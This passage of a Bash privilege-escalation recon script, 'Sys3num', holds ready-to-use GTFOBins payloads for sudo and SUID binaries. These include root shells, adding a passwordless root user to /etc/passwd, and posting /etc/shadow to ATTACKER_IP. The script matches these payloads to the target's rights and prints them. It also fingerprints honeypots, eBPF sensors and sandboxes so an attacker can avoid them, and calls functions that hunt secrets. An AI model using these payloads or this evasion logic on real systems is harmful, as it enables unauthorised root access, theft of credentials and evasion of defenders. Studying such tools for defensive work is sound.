gtfo_sudo["more"]='sudo more /etc/shadow  # then type !/bin/bash'
gtfo_sudo["man"]='sudo man man  # then type !/bin/bash'
gtfo_sudo["ftp"]='sudo ftp  # then type !/bin/bash'
gtfo_sudo["ed"]='sudo ed  # then type !/bin/bash'
gtfo_sudo["git"]='sudo git -p help  # then type !/bin/bash'
gtfo_sudo["ssh"]='sudo ssh -o ProxyCommand="sh -c /bin/bash" x'
gtfo_sudo["scp"]='TF=$(mktemp); echo "bash 0<&2 1>&2" > $TF; chmod +x $TF; sudo scp -S $TF x y:'
gtfo_sudo["tar"]='sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash'
gtfo_sudo["zip"]='sudo zip /tmp/z.zip /dev/null -T --unzip-command="sh -c /bin/bash"'
gtfo_sudo["wget"]='sudo wget --post-file=/etc/shadow http://ATTACKER_IP/'
gtfo_sudo["curl"]='sudo curl file:///etc/shadow -o /tmp/shadow_dump'
gtfo_sudo["nmap"]='echo "os.execute(\"/bin/bash\")" > /tmp/s.nse && sudo nmap --script=/tmp/s.nse'
gtfo_sudo["docker"]='sudo docker run -v /:/host -it alpine chroot /host /bin/bash'
gtfo_sudo["mysql"]='sudo mysql -e '"'"'\! /bin/bash'"'"''
gtfo_sudo["node"]='sudo node -e '"'"'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'"'"''
gtfo_sudo["php"]='sudo php -r '"'"'system("/bin/bash");'"'"''
gtfo_sudo["socat"]='sudo socat stdin exec:/bin/bash'
gtfo_sudo["strace"]='sudo strace -o /dev/null /bin/bash'
gtfo_sudo["ltrace"]='sudo ltrace -b -L /bin/bash'
gtfo_sudo["screen"]='sudo screen  # instant root shell'
gtfo_sudo["tmux"]='sudo tmux  # instant root shell'
gtfo_sudo["script"]='sudo script -q /dev/null'
gtfo_sudo["journalctl"]='sudo journalctl  # then type !/bin/bash'
gtfo_sudo["systemctl"]='sudo systemctl  # then type !bash'
gtfo_sudo["tee"]='echo "root2::0:0::/root:/bin/bash" | sudo tee -a /etc/passwd'
gtfo_sudo["cp"]='sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash && /tmp/rootbash -p'
gtfo_sudo["bash"]='sudo bash'
gtfo_sudo["sh"]='sudo sh'
gtfo_sudo["dash"]='sudo dash'
gtfo_sudo["zsh"]='sudo zsh'
gtfo_sudo["ksh"]='sudo ksh'
gtfo_sudo["csh"]='sudo csh'
gtfo_sudo["busybox"]='sudo busybox sh'
gtfo_sudo["dpkg"]='sudo dpkg -l  # then type !/bin/bash'
gtfo_sudo["apt"]='sudo apt changelog apt  # then type !/bin/bash'
gtfo_sudo["apt-get"]='sudo apt-get changelog apt  # then type !/bin/bash'
gtfo_sudo["rpm"]='sudo rpm --eval '"'"'%{lua:os.execute("/bin/bash")}'"'"''
gtfo_sudo["expect"]='sudo expect -c '"'"'spawn /bin/bash; interact'"'"''
gtfo_sudo["rlwrap"]='sudo rlwrap /bin/bash'
gtfo_sudo["nice"]='sudo nice /bin/bash'
gtfo_sudo["ionice"]='sudo ionice /bin/bash'
gtfo_sudo["time"]='sudo /usr/bin/time /bin/bash'
gtfo_sudo["timeout"]='sudo timeout 9999 /bin/bash'
gtfo_sudo["xargs"]='sudo xargs -a /dev/null /bin/bash'
gtfo_sudo["taskset"]='sudo taskset 1 /bin/bash'
gtfo_sudo["stdbuf"]='sudo stdbuf -i0 /bin/bash'
gtfo_sudo["watch"]='sudo watch -x /bin/bash -c "bash -i"'
gtfo_sudo["nsenter"]='sudo nsenter /bin/bash'
gtfo_sudo["unshare"]='sudo unshare /bin/bash'
gtfo_sudo["chroot"]='sudo chroot / /bin/bash'

# --- GTFOBins: SUID escalation payloads ---
gtfo_suid["bash"]='<SUID_PATH> -p'
gtfo_suid["sh"]='<SUID_PATH> -p'
gtfo_suid["dash"]='<SUID_PATH> -p'
gtfo_suid["zsh"]='<SUID_PATH> -p'
gtfo_suid["ksh"]='<SUID_PATH> -p'
gtfo_suid["csh"]='<SUID_PATH> -p'
gtfo_suid["python"]='<SUID_PATH> -c '"'"'import os; os.setuid(0); os.system("/bin/bash")'"'"''
gtfo_suid["python3"]='<SUID_PATH> -c '"'"'import os; os.setuid(0); os.system("/bin/bash")'"'"''
gtfo_suid["perl"]='<SUID_PATH> -e '"'"'use POSIX(setuid); POSIX::setuid(0); exec "/bin/bash";'"'"''
gtfo_suid["ruby"]='<SUID_PATH> -e '"'"'Process::Sys.setuid(0); exec "/bin/bash"'"'"''
gtfo_suid["php"]='<SUID_PATH> -r '"'"'posix_setuid(0); system("/bin/bash");'"'"''
gtfo_suid["node"]='<SUID_PATH> -e '"'"'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'"'"''
gtfo_suid["vim"]='<SUID_PATH> -c '"'"':py import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'"'"''
gtfo_suid["vi"]='<SUID_PATH> -c '"'"':!/bin/bash'"'"''
gtfo_suid["find"]='<SUID_PATH> / -exec /bin/bash -p \; -quit'
gtfo_suid["env"]='<SUID_PATH> /bin/bash -p'
gtfo_suid["strace"]='<SUID_PATH> -o /dev/null /bin/bash -p'
gtfo_suid["nmap"]='<SUID_PATH> --interactive  # then !sh (old nmap only)'
gtfo_suid["taskset"]='<SUID_PATH> 1 /bin/bash -p'
gtfo_suid["nice"]='<SUID_PATH> /bin/bash -p'
gtfo_suid["time"]='<SUID_PATH> /bin/bash -p'
gtfo_suid["timeout"]='<SUID_PATH> 9999 /bin/bash -p'
gtfo_suid["stdbuf"]='<SUID_PATH> -i0 /bin/bash -p'
gtfo_suid["xargs"]='<SUID_PATH> -a /dev/null /bin/bash -p'
gtfo_suid["awk"]='<SUID_PATH> '"'"'BEGIN {system("/bin/bash -p")}'"'"''
gtfo_suid["docker"]='<SUID_PATH> run -v /:/host -it alpine chroot /host /bin/bash'
gtfo_suid["screen"]='<SUID_PATH>  # if SUID, drops to root shell'
gtfo_suid["expect"]='<SUID_PATH> -c '"'"'spawn /bin/bash -p; interact'"'"''
gtfo_suid["cpulimit"]='<SUID_PATH> -l 100 -f /bin/bash'
gtfo_suid["aria2c"]='<SUID_PATH> --on-download-error=/bin/bash http://x'

# --- Check sudo permissions against GTFOBins ---
check_gtfobins_sudo() {
    echo -e "\n${YELLOW}[*] GTFOBins Sudo Exploit Check:${NC}"

    if ! command -v sudo >/dev/null 2>&1; then
        echo -e "${YELLOW}  - sudo not found, skipping.${NC}"
        return
    fi

    local sudo_output
    sudo_output=$(sudo -n -l 2>/dev/null)
    if [ $? -ne 0 ]; then
        echo -e "${GREEN}  [+] Cannot run sudo without password, skipping.${NC}"
        return
    fi

    # Check for (ALL) ALL — user can run anything
    if echo "$sudo_output" | grep -qE '\(ALL\s*:\s*ALL\)\s+ALL|\(ALL\)\s+ALL|\(root\)\s+ALL'; then
        log_finding "CRITICAL" "gtfobins" "User has FULL sudo access (ALL commands). Just run: sudo /bin/bash"
        return
    fi

    # Parse specific allowed binaries from sudo -l output
    echo "$sudo_output" | grep -oP '(?:NOPASSWD:\s*)?(/\S+)' | grep '^/' | while read -r allowed_bin; do
        local bin_name=$(basename "$allowed_bin")
        bin_name=${bin_name%%\**}
        [ -z "$bin_name" ] && continue

        if [ -n "${gtfo_sudo[$bin_name]+x}" ]; then
            log_finding "CRITICAL" "gtfobins" "sudo $allowed_bin -> GTFOBins exploit!"
            echo -e "  ${RED}  Payload: ${gtfo_sudo[$bin_name]}${NC}"
        fi
    done

    # Check for LD_PRELOAD preservation
    if echo "$sudo_output" | grep -qE 'env_keep.*LD_PRELOAD|env_keep.*LD_LIBRARY_PATH'; then
        log_finding "CRITICAL" "gtfobins" "sudo preserves LD_PRELOAD/LD_LIBRARY_PATH! Trivial priv esc via shared library injection."
    fi
}

# --- Check SUID binaries against GTFOBins ---
check_gtfobins_suid() {
    echo -e "\n${YELLOW}[*] GTFOBins SUID Exploit Check:${NC}"

    local suid_bins
    suid_bins=$(find /usr/bin /bin /sbin /usr/sbin /usr/local/bin /usr/local/sbin /usr/lib /opt -maxdepth 4 -xdev -type f -perm -4000 2>/dev/null)

    if [ -z "$suid_bins" ]; then
        echo -e "${GREEN}  [+] No SUID binaries found.${NC}"
        return
    fi

    local gtfo_found=0
    echo "$suid_bins" | while read -r suid_path; do
        [ -z "$suid_path" ] && continue
        local bin_name=$(basename "$suid_path")

        if [ -n "${gtfo_suid[$bin_name]+x}" ]; then
            local payload="${gtfo_suid[$bin_name]//<SUID_PATH>/$suid_path}"
            log_finding "CRITICAL" "gtfobins" "SUID $suid_path -> GTFOBins exploit!"
            echo -e "  ${RED}  Payload: $payload${NC}"
        fi
    done
}

# --- Dangerous Group Membership ---
check_dangerous_groups() {
    echo -e "\n${YELLOW}[*] Dangerous Group Membership:${NC}"
    local user_groups found=0
    user_groups=$(id 2>/dev/null)
    local dangerous_groups=("docker" "lxd" "lxc" "disk" "adm" "video" "shadow")
    for grp in "${dangerous_groups[@]}"; do
        if echo "$user_groups" | grep -qwi "$grp"; then
            case "$grp" in
                docker|lxd|lxc)
                    log_finding "CRITICAL" "groups" "User is in '$grp' group — trivial root via container escape!" ;;
                disk)
                    log_finding "CRITICAL" "groups" "User is in 'disk' group — can read/write raw block devices!" ;;
                shadow)
                    log_finding "HIGH" "groups" "User is in 'shadow' group — can read /etc/shadow!" ;;
                adm)
                    log_finding "MEDIUM" "groups" "User is in 'adm' group — can read system logs." ;;
                video)
                    log_finding "MEDIUM" "groups" "User is in 'video' group — can access framebuffer/GPU." ;;
            esac
            found=1
        fi
    done
    [ $found -eq 0 ] && echo -e "${GREEN}  [+] No dangerous group memberships found.${NC}"
}

# --- PATH Hijacking ---
check_path_hijack() {
    echo -e "\n${YELLOW}[*] PATH Hijacking Check:${NC}"
    local found=0
    IFS=':' read -ra path_dirs <<< "$PATH"
    for dir in "${path_dirs[@]}"; do
        if [ -z "$dir" ] || [ "$dir" = "." ]; then
            log_finding "HIGH" "path" "Empty or '.' entry in PATH — current-directory hijack possible!"
            found=1
        elif [ -d "$dir" ] && [ -w "$dir" ]; then
            log_finding "HIGH" "path" "Writable PATH directory: $dir"
            found=1
        fi
    done
    [ $found -eq 0 ] && echo -e "${GREEN}  [+] No writable directories in PATH.${NC}"
}

# --- World-Writable Directories ---
check_world_writable_dirs() {
    echo -e "\n${YELLOW}[*] Unexpected World-Writable Directories:${NC}"
    local ww_dirs
    ww_dirs=$(find / -maxdepth 3 -xdev -type d -perm -0002 ! -path '/tmp' ! -path '/tmp/*' ! -path '/var/tmp' ! -path '/var/tmp/*' ! -path '/dev/shm' ! -path '/dev/shm/*' ! -path '/dev/mqueue' ! -path '/dev/mqueue/*' ! -path '/run/*' ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -n 15)
    if [ -n "$ww_dirs" ]; then
        echo "$ww_dirs" | while read -r d; do
            log_finding "MEDIUM" "writable_dir" "World-writable directory: $d"
        done
    else
        echo -e "${GREEN}  [+] No unexpected world-writable directories found.${NC}"
    fi
}

# --- Systemd Timers ---
check_systemd_timers() {
    echo -e "\n${YELLOW}[*] Systemd Timers (Modern Cron):${NC}"
    if command -v systemctl >/dev/null 2>&1; then
        local timers
        timers=$(systemctl list-timers --all --no-pager 2>/dev/null | head -n 15)
        if [ -n "$timers" ]; then
            echo "$timers" | while read line; do
                echo -e "  ${DIM}$line${NC}"
            done
        else
            echo -e "${GREEN}  [+] No systemd timers found.${NC}"
        fi
    else
        echo -e "${YELLOW}  - systemctl not available.${NC}"
    fi
}

# --- NFS no_root_squash ---
check_nfs_nosquash() {
    echo -e "\n${YELLOW}[*] NFS Shares (no_root_squash check):${NC}"
    local found=0
    if [ -r /etc/exports ]; then
        local nosquash
        nosquash=$(grep -v '^\s*#' /etc/exports 2>/dev/null | grep 'no_root_squash')
        if [ -n "$nosquash" ]; then
            log_finding "CRITICAL" "nfs" "NFS exports with no_root_squash found!"
            echo "$nosquash" | sed 's/^/    /'
            found=1
        fi
    fi
    if mount 2>/dev/null | grep -q ' type nfs'; then
        log_finding "INFO" "nfs" "NFS mounts detected on this system"
        mount | grep ' type nfs' | sed 's/^/    /'
        found=1
    fi
    [ $found -eq 0 ] && echo -e "${GREEN}  [+] No NFS misconfigurations found.${NC}"
}

# --- Sudoers NOPASSWD in drop-in files ---
check_sudoers_nopasswd() {
    echo -e "\n${YELLOW}[*] Sudoers Drop-in NOPASSWD Check:${NC}"
    local found=0
    if [ -d /etc/sudoers.d ]; then
        for f in /etc/sudoers.d/*; do
            if [ -r "$f" ] && [ -f "$f" ]; then
                local nopasswd_lines
                nopasswd_lines=$(grep -i 'NOPASSWD' "$f" 2>/dev/null | grep -v '^\s*#')
                if [ -n "$nopasswd_lines" ]; then
                    log_finding "CRITICAL" "sudoers" "NOPASSWD found in $f"
                    echo "$nopasswd_lines" | sed 's/^/    /'
                    found=1
                fi
            fi
        done
    fi
    if [ -r /etc/sudoers ]; then
        local main_nopasswd
        main_nopasswd=$(grep -i 'NOPASSWD' /etc/sudoers 2>/dev/null | grep -v '^\s*#')
        if [ -n "$main_nopasswd" ]; then
            log_finding "HIGH" "sudoers" "NOPASSWD entries in /etc/sudoers"
            echo "$main_nopasswd" | sed 's/^/    /'
            found=1
        fi
    fi
    [ $found -eq 0 ] && echo -e "${GREEN}  [+] No NOPASSWD entries found in sudoers.${NC}"
}

# --- Honeypot Detection ---
check_honeypot() {
    echo -e "\n${YELLOW}[*] Honeypot & Deception Detection (Advanced):${NC}"
    local hp_found=0

    # 1. Check for known honeypot users
    local hp_users=("cowrie" "kippo" "dionaea" "glastopf" "conpot" "honeytrap" "glutton" "opencanary" "tpot")
    for user in "${hp_users[@]}"; do
        if grep -q "^${user}:" /etc/passwd 2>/dev/null; then
            log_finding "HIGH" "honeypot" "Honeypot user detected in /etc/passwd: $user"
            echo -e "  ${RED}[!] Honeypot user detected: $user${NC}"
            hp_found=1
        fi
        if [ -d "/home/${user}" ] || [ -d "/opt/${user}" ] || [ -d "/var/log/${user}" ]; then
            log_finding "HIGH" "honeypot" "Common honeypot directory found for: $user"
            echo -e "  ${RED}[!] Honeypot directory found for: $user${NC}"
            hp_found=1
        fi
    done

    # 2. Check for fake commands (Python scripts masquerading as binaries)
    for cmd in wget curl ping tar zip unzip iptables netstat lsof; do
        if command -v "$cmd" >/dev/null 2>&1; then
            if file "$(command -v "$cmd")" 2>/dev/null | grep -qi "python\|shell script"; then
                log_finding "CRITICAL" "honeypot" "Fake '$cmd' binary detected (Script!)"
                echo -e "  ${RED}[CRITICAL] Fake '$cmd' binary detected (likely Python interceptor)!${NC}"
                hp_found=1
            fi
        fi
    done

    # 3. Check for specific honeypot config files and logs
    local hp_files=(
        "/etc/cowrie/cowrie.cfg" "/opt/cowrie/cowrie.cfg" "/var/log/cowrie/cowrie.log"
        "/etc/kippo.cfg" 
        "/etc/dionaea/dionaea.conf" "/var/dionaea/bistreams/"
        "/etc/opencanaryd/opencanary.conf"
        "/data/suricata/suricata.yaml"  # common in T-Pot
    )
    for f in "${hp_files[@]}"; do
        if [ -e "$f" ] 2>/dev/null; then
            log_finding "CRITICAL" "honeypot" "Honeypot artifact found: $f"
            echo -e "  ${RED}[CRITICAL] Honeypot artifact found: $f${NC}"
            hp_found=1
        fi
    done

    # 4. Check for suspiciously low process count (High Interaction honeypot indicator)
    if command -v ps >/dev/null 2>&1; then
        local proc_count
        proc_count=$(ps -e 2>/dev/null | wc -l)
        if [ "$proc_count" -gt 0 ] && [ "$proc_count" -lt 25 ] && [ "$IS_WSL" = false ]; then
            log_finding "MEDIUM" "honeypot" "Suspiciously low process count ($proc_count) - possible restricted container/sandbox"
            echo -e "  ${YELLOW}[!] Suspiciously low process count ($proc_count)${NC}"
            hp_found=1
        fi
    fi

    # 5. Check for hardcoded MAC Addresses common in virtualization/sandboxes/honeypots
    if command -v ip >/dev/null 2>&1 || command -v ifconfig >/dev/null 2>&1; then
        local macs
        if command -v ip >/dev/null 2>&1; then
            macs=$(ip link show | grep ether | awk '{print $2}')
        else
            macs=$(ifconfig | grep ether | awk '{print $2}')
        fi
        
        # OUI Prefixes indicating VirtualBox, VMware, or common sandbox defaults
        # 08:00:27 = VBox, 00:05:69 / 00:0C:29 / 00:1C:14 / 00:50:56 = VMware
        for mac in $macs; do
            local prefix=$(echo "$mac" | cut -d':' -f1,2,3 | tr 'a-z' 'A-Z')
            if [[ "$prefix" == "08:00:27" || "$prefix" == "00:05:69" || "$prefix" == "00:0C:29" || "$prefix" == "00:1C:14" || "$prefix" == "00:50:56" ]]; then
                log_finding "INFO" "environment" "Virtualization MAC OUI detected ($prefix) - VMware/VirtualBox sandbox possible"
                echo -e "  ${YELLOW}[-] Virtualization MAC detected ($prefix) - possible sandbox/honeypot node.${NC}"
                hp_found=1
            fi
        done
    fi

    # 6. Check dmesg for virtualization/honeypot indicators (if readable)
    if command -v dmesg >/dev/null 2>&1 && dmesg 2>/dev/null | head -n1 >/dev/null; then
        if dmesg 2>/dev/null | grep -qi "virtualbox\|vmware\|qemu\|kvm\|uml"; then
            echo -e "  ${YELLOW}[-] Hypervisor/Virtualization detected in dmesg (common for sandboxes).${NC}"
            hp_found=1
        fi
    fi

    # 7. Check CPU info for known Sandboxes/Hypervisors
    if [ -r /proc/cpuinfo ]; then
        if grep -qi "qemu\|virtual\|hypervisor" /proc/cpuinfo; then
             echo -e "  ${YELLOW}[-] Hypervisor detected in /proc/cpuinfo.${NC}"
             hp_found=1
        fi
    fi

    # 8. Modern Cloud-Native Traps: Falco, Tracee, and Tetragon (eBPF Sensors)
    if command -v lsmod >/dev/null 2>&1; then
        if lsmod | grep -qi "falco\|tracee"; then
            log_finding "CRITICAL" "honeypot" "Cloud-native threat detection module loaded (Falco/Tracee)"
            echo -e "  ${RED}[CRITICAL] EDR/Honeypot kernel module loaded (Falco/Tracee)!${NC}"
            hp_found=1
        fi
    fi
    if [ -d /sys/kernel/debug/tracing ]; then
        # Check if kprobes are conspicuously attached to execve/open (common in eBPF honeypots)
        if grep -qi "sys_execve\|sys_open" /sys/kernel/debug/tracing/kprobe_events 2>/dev/null; then
             log_finding "HIGH" "honeypot" "Kernel tracing (kprobes) active on execve/open - possible eBPF sensor"
             echo -e "  ${RED}[!] Active kprobes on execve/open (Possible eBPF Honeypot/EDR)!${NC}"
             hp_found=1
        fi
    fi

    # 9. Fake Cloud Metadata Endpoints (AWS/GCP/Azure)
    # Some advanced honeypots (like Thinkst Canary) mock the 169.254.169.254 address.
    # We check if the route exists but looks highly anomalous (e.g., routed to a local userspace process instead of a proper gateway)
    if command -v ip >/dev/null 2>&1; then
        if ip route show 169.254.169.254 2>/dev/null | grep -q 'link\|lo'; then
             if ! ip route show default | grep -q '169.254.169.254'; then
                 log_finding "HIGH" "honeypot" "Anomalous routing for Cloud Metadata IP (169.254.169.254) - Possible Canary"
                 echo -e "  ${YELLOW}[!] Anomalous route for 169.254.169.254 detected (Possible Cloud Metadata Canary).${NC}"
                 hp_found=1
             fi
        fi
    fi

    # 10. SSH "Too Many Connections" or Instant Accept Traps
    # If standard ports are open but instantly drop privileges or mock responses
    if command -v ss >/dev/null 2>&1; then
        # Check if something other than sshd is bound to port 22
        local p22_bin
        p22_bin=$(ss -tlp 2>/dev/null | grep ':ssh\b\|:22\b' | grep -oP 'users:\(\("\K[^"]+')
        if [ -n "$p22_bin" ] && [ "$p22_bin" != "sshd" ] && [ "$p22_bin" != "systemd" ]; then
             log_finding "CRITICAL" "honeypot" "Non-standard binary ($p22_bin) bound to port 22!"
             echo -e "  ${RED}[CRITICAL] Port 22 is bound to '$p22_bin' instead of sshd!${NC}"
             hp_found=1
        fi
    fi

    [ $hp_found -eq 0 ] && echo -e "${GREEN}  [+] No obvious honeypot signatures or fake binaries detected.${NC}"
}

# --- Cryptominer Detection ---
check_cryptominers() {
    echo -e "\n${YELLOW}[*] Cryptominer Detection:${NC}"
    local miner_found=0

    # 1. Check for common miner process names
    local miner_procs=("xmrig" "kinsing" "kdevtmpfsi" "minerd" "cryptonight" "c3pool" "xmr-stak" "hashrate" "cpuminer" "sysupdate" "networkservice" "kthreaddk" "watchdog")
    if command -v ps >/dev/null 2>&1; then
        local running_procs
        running_procs=$(ps -eo comm= 2>/dev/null | sort | uniq)
        for proc in "${miner_procs[@]}"; do
            if echo "$running_procs" | grep -qiw "^$proc$"; then
                log_finding "CRITICAL" "malware" "Known cryptominer process running: $proc"
                echo -e "  ${RED}[CRITICAL] Cryptominer process detected: $proc${NC}"
                miner_found=1
            fi
        done

        # 2. Check for highly utilized CPU processes in /tmp, /dev/shm, or running deleted binaries
        local top_cpu
        top_cpu=$(ps -eo pid,pcpu,comm,args --sort=-pcpu 2>/dev/null | head -n 6 | tail -n 5)
        echo "$top_cpu" | while read -r pid pcpu comm args; do
            [ -z "$pid" ] && continue
            local cpu_int=${pcpu%.*}
            if [ -n "$cpu_int" ] && [ "$cpu_int" -ge 40 ] 2>/dev/null; then
                # Check suspicious path
                if echo "$args" | grep -qE '^(/tmp/|/var/tmp/|/dev/shm/|\./)'; then
                    log_finding "HIGH" "malware" "High CPU process ($pcpu%) running from suspicious path: $args"
                    echo -e "  ${RED}[!] High CPU process ($pcpu%) running from temp/shm: $args${NC}"
                    miner_found=1
                fi
                # Check deleted binary
                if [ -e "/proc/$pid/exe" ] && ls -l "/proc/$pid/exe" 2>/dev/null | grep -q " (deleted)"; then
                    log_finding "HIGH" "malware" "High CPU process ($pcpu%) executing deleted binary: $comm"
                    echo -e "  ${RED}[!] High CPU process using deleted binary (Common Evasion): $args (PID: $pid)${NC}"
                    miner_found=1
                fi
            fi
        done
    fi

    # 3. Check network connections to common mining ports (Stratum protocol defaults: 3333, 4444, 5555, 7777, 14433, 14444)
    if command -v ss >/dev/null 2>&1; then
        local mining_conns
        mining_conns=$(ss -tnp 2>/dev/null | grep -E ':3333\b|:4444\b|:5555\b|:7777\b|:14433\b|:14444\b|\.pool\b|\.mine\b|xmr')
        if [ -n "$mining_conns" ]; then
            log_finding "HIGH" "malware" "Suspicious network connection to pool/mining port"
            echo -e "  ${RED}[!] Suspicious outbound network connection to mining port/pool detected!${NC}"
            echo "$mining_conns" | head -n 3 | sed 's/^/    /'
            miner_found=1
        fi
    fi

    [ $miner_found -eq 0 ] && echo -e "${GREEN}  [+] No obvious cryptominers detected.${NC}"
}

# ============================================================
# CLI ARGUMENT PARSING
# ============================================================
QUICK_SCAN=false
FORCE_ONLINE=false
STEALTH_MODE=false
NVD_API_KEY=""
OUTPUT_FILE=""
JSON_MODE=false

while [[ $# -gt 0 ]]; do
    case "$1" in
        --help|-h)
            show_help
            ;;
        --quick)
            QUICK_SCAN=true
            shift
            ;;
        --online)
            FORCE_ONLINE=true
            shift
            ;;
        --stealth)
            STEALTH_MODE=true
            shift
            ;;
        --api-key)
            NVD_API_KEY="$2"
            shift 2
            ;;
        --output|-o)
            OUTPUT_FILE="$2"
            shift 2
            ;;
        --json)
            JSON_MODE=true
            shift
            ;;
        *)
            echo -e "${YELLOW}[!] Unknown option: $1 (use --help for usage)${NC}"
            shift
            ;;
    esac
done

# --- Output Setup ---
if [ "$JSON_MODE" = true ]; then
    # JSON mode: suppress normal output, collect findings only
    exec 3>&1 1>/dev/null 2>/dev/null
elif [ -n "$OUTPUT_FILE" ]; then
    # Tee output to file with ANSI colors stripped
    exec > >(tee >(sed $'s/\033\[[0-9;]*m//g' > "$OUTPUT_FILE"))
fi

# ============================================================
# MAIN EXECUTION
# ============================================================

echo -e "${BLUE}=========================================${NC}"
echo -e "${BLUE}  Sys3num - Privilege Escalation Recon   ${NC}"
echo -e "${BLUE}  Version 3.0 - Updated 2026-03         ${NC}"
echo -e "${BLUE}  by Lakshan                            ${NC}"
echo -e "${BLUE}=========================================${NC}"

check_dependencies
detect_wsl

detect_distro
KERNEL=$(uname -r)
echo -e "\n${YELLOW}[*] Kernel Version:${NC} $KERNEL"
list_packages
check_critical_versions
list_drivers

# Misconfigurations
check_suid_sgid
check_writable_critical
check_privileges
check_cron
check_capabilities

# Advanced Vectors
hunt_cloud_ai_secrets
scrape_deleted_secrets
check_container_escape
check_live_process_snoop
check_ssh_persistence
check_ebpf_ptrace

# New Checks (#9)
check_dangerous_groups
check_path_hijack
check_world_writable_dirs
check_systemd_timers
check_nfs_nosquash
check_systemd_timers
check_nfs_nosquash
check_sudoers_nopasswd
check_honeypot
check_cryptominers

# GTFOBins Auto-Exploitation
check_gtfobins_sudo
check_gtfobins_suid

# Always run offline checks
ANY_VULN_FOUND=0
check_offline_kernel "$KERNEL"
check_offline_modules "$modules_with_versions"

# Kernel Exploit Suggester hook
if [ $ANY_VULN_FOUND -eq 1 ]; then
    echo -e "\n${RED}[!] Vulnerable kernel/modules detected! Recommend checking searchsploit or GitHub PoCs for listed CVEs.${NC}"
fi

# Online check if possible
if has_internet && command -v curl >/dev/null 2>&1; then
    if [ "$FORCE_ONLINE" = true ]; then
        echo -e "\n${YELLOW}[*] Internet available. Running online checks (--online flag passed)...${NC}"
        online_vuln_check "linux kernel $KERNEL"
    else
        echo -e ""
        read -p "${YELLOW}[?] Internet detected. Perform online NVD check for kernel/modules? (y/N): ${NC}" yn
        if [[ $yn =~ ^[Yy]$ ]]; then
            echo -e "\n${YELLOW}[*] Running online checks...${NC}"
            online_vuln_check "linux kernel $KERNEL"
        else
            echo -e "\n${YELLOW}[!] Skipping online check.${NC}"
        fi
    fi
else
    echo -e "\n${YELLOW}[!] No internet or curl not available. Skipping online check.${NC}"
fi

# ============================================================
# FINDINGS SUMMARY (#7, #11, #12)
# ============================================================
CRIT_COUNT=$(grep -c '^CRITICAL|' "$FINDINGS_FILE" 2>/dev/null || echo 0)
HIGH_COUNT=$(grep -c '^HIGH|' "$FINDINGS_FILE" 2>/dev/null || echo 0)
MED_COUNT=$(grep -c '^MEDIUM|' "$FINDINGS_FILE" 2>/dev/null || echo 0)
INFO_COUNT=$(grep -c '^INFO|' "$FINDINGS_FILE" 2>/dev/null || echo 0)
TOTAL_COUNT=$((CRIT_COUNT + HIGH_COUNT + MED_COUNT + INFO_COUNT))

END_TIME=$(date +%s)
ELAPSED=$((END_TIME - START_TIME))

echo -e "\n${BLUE}=========================================${NC}"
echo -e "${BLUE}  FINDINGS SUMMARY                       ${NC}"
echo -e "${BLUE}=========================================${NC}"
echo -e "  ${RED}CRITICAL:${NC} $CRIT_COUNT"
echo -e "  HIGH:     $HIGH_COUNT"
echo -e "  MEDIUM:   $MED_COUNT"
echo -e "  INFO:     $INFO_COUNT"
echo -e "  TOTAL:    $TOTAL_COUNT findings"
echo -e ""
echo -e "  Scan completed in ${ELAPSED}s"

if [ -n "$OUTPUT_FILE" ]; then
    echo -e "  ${GREEN}[+] Results saved to: $OUTPUT_FILE${NC}"
fi

echo -e "${BLUE}=========================================${NC}"

# ============================================================
# JSON OUTPUT (#10)
# ============================================================
if [ "$JSON_MODE" = true ]; then
    # Restore stdout
    exec 1>&3 3>&-

    echo '{'
    echo '  "version": "3.0",'
    echo "  \"timestamp\": \"$(date -Iseconds 2>/dev/null || date)\","
    echo "  \"kernel\": \"$KERNEL\","
    echo "  \"scan_duration_seconds\": $ELAPSED,"
    echo '  "summary": {'
    echo "    \"critical\": $CRIT_COUNT,"
    echo "    \"high\": $HIGH_COUNT,"
    echo "    \"medium\": $MED_COUNT,"
    echo "    \"info\": $INFO_COUNT,"
    echo "    \"total\": $TOTAL_COUNT"
    echo '  },'
    echo '  "findings": ['

    first=true
    while IFS='|' read -r sev cat msg; do
        [ -z "$sev" ] && continue
        # Escape JSON special chars in message
        msg=$(echo "$msg" | sed 's/\\/\\\\/g; s/"/\\"/g')
        if [ "$first" = true ]; then
            first=false
        else
            echo ','
        fi
        printf '    {"severity": "%s", "category": "%s", "message": "%s"}' "$sev" "$cat" "$msg"
    done < "$FINDINGS_FILE"

    echo ''
    echo '  ]'
    echo '}'
fi